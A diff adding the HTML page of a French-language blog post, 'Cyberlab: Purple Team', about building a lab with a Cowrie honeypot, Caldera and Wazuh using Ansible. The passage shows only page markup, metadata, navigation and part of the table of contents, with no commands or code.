@@ -1,0 +1,2965 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr" class="scroll-smooth" data-default-appearance="dark"
+  data-auto-appearance="false"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  
+  <meta http-equiv="content-language" content="en" />
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+  
+  <title>Cyberlab: Purple Team &middot; Raizen | Blog</title>
+  <meta name="title" content="Cyberlab: Purple Team &middot; Raizen | Blog" />
+  
+  <meta name="description" content="L’idée est de créer un écosystème cohérent dans lequel les interactions entre le honeypot, le simulateur d’attaques (Caldera) et le SIEM (Wazuh) permettent de valider la résilience globale de l&#39;infrastructure..." />
+  <meta name="keywords" content="ansible, honeypot, caldera, wazuh, mitre-attack, " />
+  
+  
+  <link rel="canonical" href="//localhost:1313/posts/cyberlab-ii/" />
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <link type="text/css" rel="stylesheet" href="/css/main.bundle.min.336d2e6ddad1531c3497265fbcb5cb4512011bbd3879222b79a85ed4c632dfb9a7945fe4194adad84f84aa208221122e2ed2d8e9299388705f78a5ed538a71b4.css"
+    integrity="sha512-M20ubdrRUxw0lyZfvLXLRRIBG704eSIreahe1MYy37mnlF/kGUra2E&#43;EqiCCIRIuLtLY6SmTiHBfeKXtU4pxtA==" />
+  
+  
+  <script type="text/javascript" src="/js/appearance.min.516a16745bea5a9bd011138d254cc0fd3973cd55ce6e15f3dec763e7c7c2c7448f8fe7b54cca811cb821b0c7e12cd161caace1dd794ac3d34d40937cbcc9ee12.js"
+    integrity="sha512-UWoWdFvqWpvQERONJUzA/TlzzVXObhXz3sdj58fCx0SPj&#43;e1TMqBHLghsMfhLNFhyqzh3XlKw9NNQJN8vMnuEg=="></script>
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <script defer type="text/javascript" id="script-bundle" src="/js/main.bundle.min.8b56b0fd46524eaecbfe33f576b8ba2cd2a122521a89f8229a95be0b635a7ac8e774eb1d8b8b93b32bbd677c3deb734aeea62917443f124d5bf5478859767380.js"
+    integrity="sha512-i1aw/UZSTq7L/jP1dri6LNKhIlIaifgimpW&#43;C2NaesjndOsdi4uTsyu9Z3w963NK7qYpF0Q/Ek1b9UeIWXZzgA==" data-copy="" data-copied=""></script>
+  
+  
+  <script src="/js/zoom.min.js"></script>
+  
+  
+  
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+  <link rel="manifest" href="/site.webmanifest" />
+  
+  
+  
+  
+  
+  
+  
+  <meta property="og:url" content="//localhost:1313/posts/cyberlab-ii/">
+  <meta property="og:site_name" content="Raizen | Blog">
+  <meta property="og:title" content="Cyberlab: Purple Team">
+  <meta property="og:description" content="Environnement automatisé Red/Blue Team avec honeypot, simulateur C2 et SIEM">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-03-20T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-03-20T00:00:00+00:00">
+    <meta property="article:tag" content="Ansible">
+    <meta property="article:tag" content="Honeypot">
+    <meta property="article:tag" content="Caldera">
+    <meta property="article:tag" content="Wazuh">
+    <meta property="article:tag" content="Mitre-Attack">
+    <meta property="og:image" content="//localhost:1313/posts/cyberlab-ii/cover.png">
+
+  
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="//localhost:1313/posts/cyberlab-ii/cover.png">
+  <meta name="twitter:title" content="Cyberlab: Purple Team">
+  <meta name="twitter:description" content="Environnement automatisé Red/Blue Team avec honeypot, simulateur C2 et SIEM">
+
+  
+  <script type="application/ld+json">
+  [{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Posts",
+    "name": "Cyberlab: Purple Team",
+    "headline": "Cyberlab: Purple Team",
+    "description": "Environnement automatisé Red\/Blue Team avec honeypot, simulateur C2 et SIEM",
+    "abstract": "L’idée est de créer un écosystème cohérent dans lequel les interactions entre le honeypot, le simulateur d’attaques (Caldera) et le SIEM (Wazuh) permettent de valider la résilience globale de l\u0026rsquo;infrastructure\u0026hellip;",
+    "inLanguage": "en",
+    "url" : "\/\/localhost:1313\/posts\/cyberlab-ii\/",
+    "author" : {
+      "@type": "Person",
+      "name": "Rai2en"
+    },
+    "copyrightYear": "2025",
+    "dateCreated": "2025-03-20T00:00:00\u002b00:00",
+    "datePublished": "2025-03-20T00:00:00\u002b00:00",
+    
+    "dateModified": "2025-03-20T00:00:00\u002b00:00",
+    
+    "keywords": ["ansible","honeypot","caldera","wazuh","mitre-attack"],
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "3672"
+  }]
+  </script>
+
+
+  
+  
+  <meta name="author" content="Rai2en" />
+  
+  
+  
+  <link href="mailto:r4izen777@gmail.com" rel="me" />
+  
+  
+  <link href="https://github.com/Rai2en" rel="me" />
+  
+  
+  <link href="https://www.linkedin.com/in/crispus-houessou/" rel="me" />
+  
+  
+  <link href="https://x.com/0xR4zn" rel="me" />
+  
+  
+  
+  
+
+<script src="/lib/jquery/jquery.slim.min.js" integrity=""></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+
+
+  
+  
+  <meta name="theme-color"/>
+  
+  
+</head>
+<body
+  class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32 scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600">
+  <div id="the-top" class="absolute flex self-center">
+    <a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
+      href="#main-content"><span
+        class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>Skip to main content</a>
+  </div>
+  
+  
+  <div class="min-h-[148px]"></div>
+<div class="fixed inset-x-0 pl-[24px] pr-[24px]" style="z-index:100">
+  <div id="menu-blur" class="absolute opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl shadow-2xl"></div>
+  <div class="relative max-w-[64rem] ml-auto mr-auto">
+    <div style="padding-left:0;padding-right:0;padding-top:2px;padding-bottom:3px"
+    class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start space-x-3">
+    
+    
+    
+    <div>
+        <a href="/" class="flex">
+            <span class="sr-only">Raizen | Blog</span>
+
+            <img src="/img/avatar.png" width="256" height="256"
+                class="logo max-h-[5rem] max-w-[5rem] object-scale-down object-left nozoom" alt="Raizen | Blog" />
+
+        </a>
+    </div>
+    
+    <div class="flex flex-1 items-center justify-between">
+        <nav class="flex space-x-3">
+
+            
+            <a href="/" class="text-base font-medium text-gray-500 hover:text-gray-900">Raizen | Blog</a>
+            
+
+        </nav>
+        <nav class="hidden md:flex items-center space-x-5 md:ml-12 h-12">
+
+            
+            
+            
+  <a href="/about/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-base font-medium" title="">
+        About
+    </p>
+</a>
+
+
+
+            
+            
+  <a href="/posts/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-base font-medium" title="">
+        Posts
+    </p>
+</a>
+
+
+
+            
+            
+  <a href=""  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-base font-medium" title="">
+        Projects
+    </p>
+</a>
+
+
+
+            
+            
+  <a href=""  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-base font-medium" title="">
+        Resume
+    </p>
+</a>
+
+
+
+            
+            
+
+            
+
+
+            
+            <button id="search-button" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+                title="">
+                
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+            </button>
+            
+
+
+            
+            
+            <div
+                class="ltr:mr-14 rtl:ml-14 flex items-center">
+                <button id="appearance-switcher" aria-label="Dark mode switcher" type="button" class="text-base hover:text-primary-600 dark:hover:text-primary-400">
+                    <div class="flex items-center justify-center dark:hidden">
+                        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+
+  </span>
+
+
+                    </div>
+                    <div class="items-center justify-center hidden dark:flex">
+                        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+
+  </span>
+
+
+                    </div>
+                </button>
+            </div>
+            
+
+        </nav>
+        <div class="flex md:hidden items-center space-x-5 md:ml-12 h-12">
+
+            <span></span>
+
+            
+
+
+            
+            <button id="search-button-mobile" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+                title="">
+                
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+            </button>
+            
+
+            
+            
+            <button id="appearance-switcher-mobile" aria-label="Dark mode switcher" type="button" class="text-base hover:text-primary-600 dark:hover:text-primary-400" style="margin-right:5px">
+                <div class="flex items-center justify-center dark:hidden">
+                    
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+
+  </span>
+
+
+                </div>
+                <div class="items-center justify-center hidden dark:flex">
+                    
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+
+  </span>
+
+
+                </div>
+            </button>
+            
+
+        </div>
+    </div>
+    <div class="-my-2 -mr-2 md:hidden">
+
+        <label id="menu-button" for="menu-controller" class="block">
+            <input type="checkbox" id="menu-controller" class="hidden" />
+            
+            <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
+                
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+
+  </span>
+
+
+            </div>
+            <div id="menu-wrapper" style="padding-top:5px;"
+                class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50">
+                <ul
+                    class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl">
+
+                    <li>
+                        <span
+                            class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+</span>
+                    </li>
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/about/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-bg font-bg" title="">
+            About
+        </p>
+    </a>
+</li>
+
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/posts/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-bg font-bg" title="">
+            Posts
+        </p>
+    </a>
+</li>
+
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href=""  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-bg font-bg" title="">
+            Projects
+        </p>
+    </a>
+</li>
+
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href=""  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-bg font-bg" title="">
+            Resume
+        </p>
+    </a>
+</li>
+
+
+
+
+                    
+
+                </ul>
+                
+                
+
+            </div>
+        </label>
+    </div>
+</div>
+
+
+
+
+
+  </div>
+</div>
+<script>
+  window.addEventListener('scroll', function (e) {
+    var scroll = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0;
+    var background_blur = document.getElementById('menu-blur');
+    background_blur.style.opacity = (scroll / 300);
+  });
+</script>
+
+  
+  <div class="relative flex flex-col grow">
+    <main id="main-content" class="grow">
+      
+
+
+<article>
+  
+  
+  
+  
+  
+  
+
+
+<div id="hero" class="h-[150px] md:h-[200px]"></div>
+
+
+
+    
+    <div class="fixed inset-x-0 top-0 h-[800px] single_hero_background nozoom"
+    style="background-image:url(/posts/cyberlab-ii/cover_hudfae4765b05cc652fbfa48f9d7e48a3e_85340_1200x0_resize_box_3.png);">
+    
+
+
+    <div class="absolute inset-0 bg-gradient-to-t from-neutral dark:from-neutral-800 to-transparent mix-blend-normal">
+    </div>
+    <div
+        class="absolute inset-0 opacity-60 bg-gradient-to-t from-neutral dark:from-neutral-800 to-neutral-100 dark:to-neutral-800 mix-blend-normal">
+    </div>
+</div>
+
+<div id="background-blur" class="fixed opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl"></div>
+<script>
+    window.addEventListener('scroll', function (e) {
+        var scroll = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0;
+        var background_blur = document.getElementById('background-blur');
+        background_blur.style.opacity = (scroll / 300)
+    });
+</script>
+
+  
+  
+
+  <header id="single_header" class="mt-5 max-w-prose">
+    
+    <ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden">
+  
+  
+    
+  
+    
+  
+  <li class="inline hidden">
+    <a
+      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
+      href="/"
+      >Raizen | Blog</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class="inline ">
+    <a
+      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
+      href="/posts/"
+      >Posts</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class="inline hidden">
+    <a
+      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
+      href="/posts/cyberlab-ii/"
+      >Cyberlab: Purple Team</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+</ol>
+
+
+    
+    <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+      Cyberlab: Purple Team
+    </h1>
+    <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+      
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  <time datetime="2025-03-20 00:00:00 &#43;0000 UTC">20 March 2025</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">18 mins</span>
+  
+
+  
+  
+</div>
+
+
+
+
+
+
+
+    </div>
+
+    
+    
+    
+    
+    
+
+    
+
+    
+      
+      
+        
+        
+<div class="flex author">
+  
+    
+    
+      
+    
+    
+      
+        
+      
+      <img class="!mt-0 !mb-0 h-24 w-24 rounded-full ltr:mr-4 rtl:ml-4" width="96" height="96"
+      alt="Rai2en" src="/img/av_hu2199a7f11da6a332d7bd54c7b402dbf0_39490_192x192_fill_box_smart1_3.png" />
+    
+  
+  <div class="place-self-center">
+    
+    <div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">
+      Author
+    </div>
+    <div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">
+      Rai2en
+    </div>
+    
+    
+    <div class="text-sm text-neutral-700 dark:text-neutral-400">Exploiting the unseen, mastering the unknown</div>
+    
+    <div class="text-2xl sm:text-lg">
+  <div class="flex flex-wrap text-neutral-400 dark:text-neutral-500">
+    
+      
+        <a
+          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
+          href="mailto:r4izen777@gmail.com"
+          target="_blank"
+          aria-label="Email"
+          rel="me noopener noreferrer"
+          ><span class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M207.8 20.73c-93.45 18.32-168.7 93.66-187 187.1c-27.64 140.9 68.65 266.2 199.1 285.1c19.01 2.888 36.17-12.26 36.17-31.49l.0001-.6631c0-15.74-11.44-28.88-26.84-31.24c-84.35-12.98-149.2-86.13-149.2-174.2c0-102.9 88.61-185.5 193.4-175.4c91.54 8.869 158.6 91.25 158.6 183.2l0 16.16c0 22.09-17.94 40.05-40 40.05s-40.01-17.96-40.01-40.05v-120.1c0-8.847-7.161-16.02-16.01-16.02l-31.98 .0036c-7.299 0-13.2 4.992-15.12 11.68c-24.85-12.15-54.24-16.38-86.06-5.106c-38.75 13.73-68.12 48.91-73.72 89.64c-9.483 69.01 43.81 128 110.9 128c26.44 0 50.43-9.544 69.59-24.88c24 31.3 65.23 48.69 109.4 37.49C465.2 369.3 496 324.1 495.1 277.2V256.3C495.1 107.1 361.2-9.332 207.8 20.73zM239.1 304.3c-26.47 0-48-21.56-48-48.05s21.53-48.05 48-48.05s48 21.56 48 48.05S266.5 304.3 239.1 304.3z"/></svg>
+
+  </span>
+
+</span></a
+        >
+      
+    
+      
+        <a
+          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
+          href="https://github.com/Rai2en"
+          target="_blank"
+          aria-label="Github"
+          rel="me noopener noreferrer"
+          ><span class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+
+  </span>
+
+</span></a
+        >
+      
+    
+      
+        <a
+          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
+          href="https://www.linkedin.com/in/crispus-houessou/"
+          target="_blank"
+          aria-label="Linkedin"
+          rel="me noopener noreferrer"
+          ><span class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
+
+  </span>
+
+</span></a
+        >
+      
+    
+      
+        <a
+          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
+          href="https://x.com/0xR4zn"
+          target="_blank"
+          aria-label="X-Twitter"
+          rel="me noopener noreferrer"
+          ><span class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg>
+  </span>
+
+</span></a
+        >
+      
+    
+  </div>
+
+</div>
+  </div>
+</div>
+
+      
+
+      
+
+      
+      <div class="mb-5"></div>
+      
+
+    
+
+  </header>
+  
+  <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
+    
+     <div
+      class="order-first lg:ml-auto px-0 lg:order-last ltr:lg:pl-8 rtl:lg:pr-8">
+      <div class="toc ltr:pl-5 rtl:pr-5 print:hidden lg:sticky lg:top-[140px]">
+
+         <details open id="TOCView"
+  class="toc-right mt-0 overflow-y-scroll overscroll-contain scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600 rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 hidden lg:block">
+  <summary
+    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="min-w-[220px] py-2 border-dotted ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction"><strong>Introduction</strong></a></li>
+    <li><a href="#1-configuration-et-déploiement-de-lenvironnement">1. Configuration et déploiement de l&rsquo;environnement</a></li>
+    <li><a href="#2-mise-à-jour-et-installation-des-outils-de-base">2. Mise à jour et installation des outils de base</a>
+      <ul>
+        <li><a href="#21-installation-de-base-pour-toutes-les-vms">2.1. Installation de base (pour toutes les VMs)</a></li>
+        <li><a href="#22-configuration-de-lenvironnement-ansible">2.2 Configuration de l&rsquo;Environnement Ansible</a></li>
+      </ul>
+    </li>
+    <li><a href="#3-installation-et-configuration-des-services">3. Installation et configuration des services</a>
+      <ul>
+        <li><a href="#31-vm-cowrie-honeypot">3.1. VM Cowrie (Honeypot)</a></li>
+        <li><a href="#32-déploiement-manuel">3.2. Déploiement manuel</a>
+          <ul>
+            <li></li>
+          </ul>
+        </li>
+        <li><a href="#33-automatisation-du-déploiement-avec-ansible">3.3. Automatisation du déploiement avec Ansible</a></li>
+      </ul>
+    </li>
+    <li><a href="#4-vm-caldera--déploiement-du-serveur-c2">4. VM Caldera – Déploiement du Serveur C2</a>
+      <ul>
+        <li><a href="#41-installation-de-caldera">4.1. Installation de Caldera</a></li>
+        <li><a href="#42-compilation-du-front-end-et-accès-à-linterface-web">4.2. Compilation du Front-end et Accès à l&rsquo;interface web</a></li>
+        <li><a href="#43-intégration-de-plugins">4.3. Intégration de plugins</a></li>
+        <li><a href="#44-déploiement-de-lagent-caldera-sur-la-vm-cowrie">4.4. Déploiement de l&rsquo;agent Caldera sur la VM Cowrie</a></li>
+      </ul>
+    </li>
